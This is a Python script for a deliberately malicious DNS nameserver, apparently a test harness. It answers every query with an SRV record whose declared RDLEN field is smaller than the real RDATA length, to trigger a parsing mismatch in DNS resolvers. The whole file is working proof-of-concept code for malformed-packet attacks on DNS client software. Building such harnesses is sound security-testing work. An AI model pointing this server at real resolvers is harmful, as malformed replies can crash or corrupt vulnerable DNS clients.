#!/usr/bin/env python3
"""Standalone evil authoritative nameserver (UDP) that returns a crafted SRV reply.

This server returns an SRV answer whose RDLEN field can be set smaller than
actual RDATA length to reproduce the rdlen/remaining-bytes mismatch.

Usage:
  python3 evil_ns.py --host 127.0.0.1 --port 5354 --rdlen 6

The default crafted RDATA is: prio(0)/weight(0)/port(80) + pointer to question name
(actual RDATA length = 8). Set --rdlen to 6 to create a mismatch.
"""

import argparse
import socket
import struct
import sys


def parse_qname_end(buf: bytes, off: int) -> int:
    """Return offset just past the qname."""
    while True:
        if off >= len(buf):
            return off
        l = buf[off]
        if l == 0:
            return off + 1
        if (l & 0xC0) == 0xC0:
            return off + 2
        off += 1 + l


def build_response(req: bytes, rdlen_override: int) -> bytes:
    # DNS header: id, flags, qdcount, ancount, nscount, arcount
    qid = req[:2]
    flags = struct.pack(">H", 0x8180)  # QR=1, standard response, RD/RA as-is
    qdcount = struct.pack(">H", 1)
    ancount = struct.pack(">H", 1)
    nscount = arcount = struct.pack(">H", 0)
    header = qid + flags + qdcount + ancount + nscount + arcount

    # copy question section as-is
    qend = parse_qname_end(req, 12)
    question = req[12:qend + 4]

    # Owner for answer: pointer to question name at offset 12
    owner_ptr = b"\xC0\x0C"
    # SRV RDATA: prio(2) weight(2) port(2) + target (compressed pointer)
    rdata = struct.pack(">HHH", 0, 0, 80) + owner_ptr  # actual length = 8

    rdlen = int(rdlen_override)
    answer = (
        owner_ptr
        + struct.pack(">HHI", 33, 1, 60)  # SRV (33), class IN, TTL
        + struct.pack(">H", rdlen)
        + rdata
    )

    return header + question + answer


def main():
    ap = argparse.ArgumentParser(description="Evil authoritative UDP nameserver (SRV) for rdlen tests")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=5354)
    ap.add_argument("--rdlen", type=int, default=6, help="Declared RDLEN (actual is 8)")
    ap.add_argument("--debug", action="store_true")
    args = ap.parse_args()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind((args.host, args.port))
    except OSError as e:
        print(f"[!] bind failed: {e}")
        sys.exit(2)

    print(f"[*] evil_ns listening on {args.host}:{args.port} (UDP) -- rdlen={args.rdlen}")
    try:
        while True:
            data, addr = sock.recvfrom(4096)
            if not data:
                continue
            if args.debug:
                print(f"[>] Received {len(data)} bytes from {addr}")
            try:
                resp = build_response(data, args.rdlen)
            except Exception as e:
                if args.debug:
                    print(f"[!] build_response error: {e}")
                continue
            try:
                sock.sendto(resp, addr)
                if args.debug:
                    print(f"[<] Sent {len(resp)} bytes to {addr}")
            except OSError:
                pass
    except KeyboardInterrupt:
        print('\n[*] shutting down')
    finally:
        sock.close()


if __name__ == "__main__":
    main()